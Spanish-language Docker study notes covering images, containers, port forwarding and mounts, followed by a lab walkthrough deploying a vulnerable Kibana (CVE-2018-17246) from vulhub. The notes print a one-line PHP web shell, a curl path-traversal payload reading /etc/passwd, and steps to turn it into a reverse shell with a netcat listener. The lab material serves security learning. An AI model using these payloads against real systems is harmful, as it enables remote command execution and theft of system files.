## Explicaciones Docker

Para crear una imagen de Docker, es necesario tener un archivo Dockerfile que defina la configuración de la imagen. Algunas de las secciones más comunes en un archivo Dockerfile son:

- FROM: se utiliza para especificar la imagen base desde la cual se construirá la nueva imagen.
- RUN: se utiliza para ejecutar comandos en el interior del contenedor, como la instalación de paquetes o la configuración del entorno.
- COPY: se utiliza para copiar archivos desde el sistema host al interior del contenedor.
- CMD: se utiliza para especificar el comando que se ejecutará cuando se arranque el contenedor.

Una vez que se tiene el Dockerfile, se puede utilizar el comando `docker build` para construir la imagen.

`docker build [opciones] ruta_al_Dockerfile`

`docker build -t mi_imagen:v1 ruta_al_Dockerfile` - Ver ejemplo en [Comandos](#Comandos)

- El parámetro `-t` permite indicar un nombre y una etiqueta a la imagen. 

Además, si se añade algo nuevo al Dockerfile y se vuelve a hacer un `docker build`, Docker se encarga de cachear todo lo que ejecutó anteriormente y lleva a cabo únicamente las nuevas instrucciones que se hayan añadido.

El comando `docker pull`  se utiliza para descargar una imagen de Docker desde un registro de imágenes.

`docker pull nombre_de_la_imagen:etiqueta` - Ver ejemplo en [Comandos](#Comandos)

El comando `docker run` se utiliza para crear y arrancar un contenedor a partir de una imagen:

- `-d` o `--detach`: se utiliza para arrancar el contenedor en segundo plano, en lugar de en primer plano.
- `-i` o `--interactive--`: se utiliza para permitir la entrada interactiva al contenedor.
- `-t` o `–tty`: se utiliza para asignar un pseudoterminal al contenedor.
- `--name`: se utiliza para asignar un nombre al contenedor

`docker run [opciones] nombre_de_la_imagen`  - Ver ejemplo en [Comandos](#Comandos)

Se puede utilizar el comando `docker ps` para listar los contenedores que están en ejecución en el sistema: 

- `-a` o `--all`: se utiliza para listar todos los contenedores, incluyendo los contenedores detenidos.
- `-q` o `--quiet`: se utiliza para mostrar sólo los identificadores numéricos de los contenedores.

Para ejecutar comandos en un contenedor que ya está en ejecución, se utiliza el comando `docker exec` con diferentes opciones:

- `-i` o `--interactive`: se utiliza para permitir la entrada interactiva al contenedor.
- `-t` o `--tty`: se utiliza para asignar un pseudoterminal al contenedor.

### Port Forwarding

El **port forwarding** nos permitirá redirigir el tráfico de red desde un puerto específico en el host a un puerto específico en el contenedor, lo que nos permitirá acceder a los servicios que se ejecutan dentro del contenedor desde el exterior.

Para este ejemplo, se procederá a montar un servidor **apache** dentro del contenedor, al cual se pretende acceder desde el host, redirigiendo la petición al contenedor gracias al **port forwarding**.

Para crear un contenedor en el que se redirijan los puertos, se deberá usar el comando `run` con el parámetro `-p`. En la sección de [Comandos](#Comandos) se podrá ver el uso del comando con más detalle.

Una vez creado, con el siguiente comando se podrá observar en el host que el puerto 80 está siendo usado por Docker. Por lo tanto, todas las peticiones que se hagan bajo ese puerto del host serán redirigidas al puerto 80 del contenedor.

	lsof -i:80

Después de esto, al acceder a la web desde el host, mediante *localhost*, o accediendo al equipo host desde otro equipo que esté en la misma red (a través de la IP del host e indicando el puerto) [192.168.1.64:80] se verá la página web por defecto de apache que está siendo enviada desde el contenedor.

Es seguro hacer que los aplicativos se encuentren dentro del contenedor, ya que si un atacante lograse tener acceso a la máquina, estaría teniendo únicamente acceso al contenedor y no al host.

Por ejemplo, si un atacante inyectase el siguiente fichero *php* en el servidor (el contenedor en este caso) podría llegar a ejecutar comandos de forma remota:

	<?php
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
	?>

Con esta estructura se consigue que se muestre a través del navegador el resultado de ejecutar un comando en la shell y, este comando, ejecutará cualquier comando que se le indique a través del parámetro `cmd` que es obtenido mediante el método `GET`. Por lo que si en la URL se escribe <https://localhost/cmd.php?cmd=whoami> se obtendrá el resultado por pantalla de la ejecución del comando `whoami`.

### Monturas

Las **monturas** nos permitirán compartir un directorio o archivo entre el sistema host y el contenedor, lo que será útil para guardar de forma persistente la información entre ejecuciones de contenedores y compartir datos entre diferentes contenedores.

Tal y como se puede observar en la sección [Comandos](#Comandos), con el comando `run` y el parámetro `-v` se puede hacer que el host y el contenedor compartan un directorio. De esta manera, los ficheros que se encuentren en ese directorio del host estarán también en el directorio indicado del contenedor. Además, si se lleva a cabo una modificación desde el host de uno de los archivos, los cambios se realizarán también en los archivos del contenedor y viceversa.


### Docker Compose - Despliegue de máquinas vulnerables

A la hora de usar Docker, hay veces en las que se hace uso de muchos parámetros, es por eso que existen herramientas como **Docker Compose**, la cual permite definir todos los parámetros y configuraciones necesarias en un archivo con extensión *.yml*. 

En este apartado se llevará a cabo el despliegue de máquinas vulnerables haciendo uso de **Docker Compose**. Las máquinas vulnerables están disponibles en el siguiente repositorio: [vulhub](https://github.com/vulhub/vulhub).

La primera vulnerabilidad se trata de una versión de **_kibana_** la cual es vulnerable al **Local File Inclusion** (LFI) y derivable a un **Remote File Inclusion** (RFI).

La URL original de la subcarpeta que se quiere clonar es la siguiente: <https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2018-17246> 

Sin embargo, sustituyendo la parte de la URL en la que pone *"/tree/master/"* por *"/trunk/"*, y usando el siguiente comando, se podrá clonar esa subcarpeta:

	svn checkout https://github.com/vulhub/vulhub/trunk/kibana/CVE-2018-17246

Una vez clonada la subcarpeta, solo se deberá ejecutar el comando de **Docker Compose** que se indica en la explicación:

	docker-compose up -d

En caso de que al ejecutar este comando no se creen correctamente los dos contenedores correspondientes (el de kibana y el de elasticsearch), se deberá usar el siguiente comando:

	sudo sysctl -w vm.max_map_count=262144

Este comando es necesario, debido a que aplicaciones y servicios como *Elasticsearch* necesitan una cantidad mayor de áreas de mapeo de memoria para funcionar de forma eficiente. Es decir, el valor por defecto del parámetro *"vm.max_map_count"* es insuficiente para que el servicio de *Elasticsearch* pueda trabajar de forma eficiente y acceder a los datos de memoria sin ningún problema. Es por eso que mediante ese comando se aumenta el número de regiones de mapeo de memoria.

A continuación, y una vez creados los contenedores (siendo accesible el servicio de kibana de la siguiente manera: <http://localhost:5061>), se podrá ejecutar el siguiente comando para abusar del LFI:

	curl -s -X GET "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"

- El parámetro `-s` se usa para que la ejecución sea silenciosa y no muestre texto por pantalla.
- El parámetro `-X` indica el tipo de método HTTP que será usado.

Como resultado de la ejecución del comando aparece un error del servidor. Sin embargo, si se visualizan los logs con el siguiente comando, se podrá visualizar el contenido del fichero */etc/passwd/"*:

	docker-compose logs

De esta manera, se ha demostrado que se puede acceder a un fichero del sistema apuntando a él a través del LFI. Por eso mismo, ahora se deberá insertar un archivo malicioso en el sistema (se ha de suponer que a través de cierta vulnerabilidad se ha logrado introducir dicho archivo en el contenedor), para después mediante el LFI apuntar a ese archivo *javascript* malicioso y que se ejecute, llegando a poder ejecutar comandos de forma remota y habiendo derivado este LFI en un RFI.

Con el siguiente comando se puede acceder a la ejecución de comandos en el contenedor y poder introducir el fichero malicioso:

	docker-compose exec kibana bash

El fichero *javascript* puede encontrarse en el siguiente repositorio: [Node Reverse Shell](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell).

En caso de no poder instalar *nano* para crear el fichero en el contenedor, se deberá borrar el contenido del fichero *"/etc/apt/sources.list/"*, e incluir la siguiente línea: "deb http://archive.debian.org/debian/ jessie contrib main non-free".

Si dicho fichero se consiguiera subir al contenedor, y ser apuntado y ejecutado mediante el LFI, básicamente trataría de ejecutar una *Reverse Shell* (una consola de ejecución de comandos enviada por el contenedor al atacante), enviándola a un puerto de una IP dada.

Por lo tanto, sería necesario ponerse en escucha en dicho puerto, haciendo uso de *netcat*, de la siguiente forma:

	nc -nlvp 443

El comando `nc`, así como los parámetros usados, será explicado más adelante en los siguientes temas. Pero, básicamente, hace que nos pongamos en escucha por el puerto especificado.

De esta forma, y cambiando la ruta en el comando `curl` (especificando el archivo *"/tmp/reverse.js/"* en lugar del *"/etc/passwd/"*), habremos ganado acceso a una consola interactiva en el equipo atacante.

Con el siguiente comando se puede visualizar la consola de una forma más visual y entendible:

	script /dev/null -c bash

## Comandos

**Instalación de Docker**

	apt install docker.io

**Montaje de la imagen**

	docker build -t my_first_image:v2 .

- Busca en el directorio actual el archivo *Dockerfile*.
- Con el parámetro `-t` se especifica un nombre para la imagen.
- Se puede incrustar una etiqueta a la imagen con `:v2`.

**Descarga de imagen de los repositorios de Docker**

	docker pull debian:latest

**Visualización de las imágenes disponibles**

	docker images

- Si se añadiese el parámetro `-q` se mostrarían únicamente los identificadores de las imágenes.

**Creación y arranque de un contenedor a partir de una imagen**

	docker run -dit --name myContainer my_first_image

- Con `-d` se arranca el contenedor en segundo plano.
- Con `-i` se indica que el contenedor sea interactivo.
- Con `-t` se habilita el uso de una terminal virtual.
- Con `--name` se le puede asignar un nombre al contenedor (para no trabajar con identificadores).
- Finalmente se indica la imagen que deberá usarse para la creación del contenedor.

En el siguiente comando se realiza lo mismo pero se usa la segunda versión de la imagen:

	docker run -dit --name mySecondContainer my_first_image:v2

**Creación de contenedor con redirección de puertos**

	docker run -dit -p 80:80 --name myWebServer webserver

**Creación de un contenedor con monturas**

	docker run -dit -p 80:80 -v /home/dalnitak/docker/:/var/www/html/ --name myWebServer webserver

**Visualización de los puertos de un contenedor**

	docker port myWebServer

**Visualización de los logs de un contenedor**

	docker logs 4c8cc2efda27

**Listado de los contenedores del sistema**

	docker ps -a

- Con el parámetro `-a` se listan los contenedores activos e inactivos.
- Si únicamente se ejecuta `docker ps`, se muestran solo los contenedores activos.
- Con `-q` se mostrarían los identificadores de los contenedores activos.

**Ejecución de un contenedor por nombre (o identificador)**

	docker exec -it myContainer bash

- Al incluir `bash` al final del comando, se le especifica que ejecute una *bash* en la terminal virtual.

**Inicio de un contenedor parado**

	docker start containerName
	docker start containerID

**Parada de un contenedor activo**

	docker stop containerName
	docker stop containerID

**Borrado de una imagen**

	docker rmi imagenID

- La eliminación de una imagen eliminará también cualquier contenedor que se haya creado a partir de esa imagen.

**Borrado de todas las imágenes**

	docker rmi $(docker images -q)

**Borrado de imágenes "none"**

	docker rmi $(docker images --filter "dangling=true" -q)

**Borrado de un contenedor**

	docker rm containerID

- En caso de estar "corriendo", Docker no permitirá que se borre el contenedor. En ese caso se podría usar el parámetro `--force`.

**Borrado de todos los contenedores**

	docker rm $(docker ps -a -q) --force

- Con `$(docker ps -a -q)` se muestran todos los identificadores de todos los contenedores.



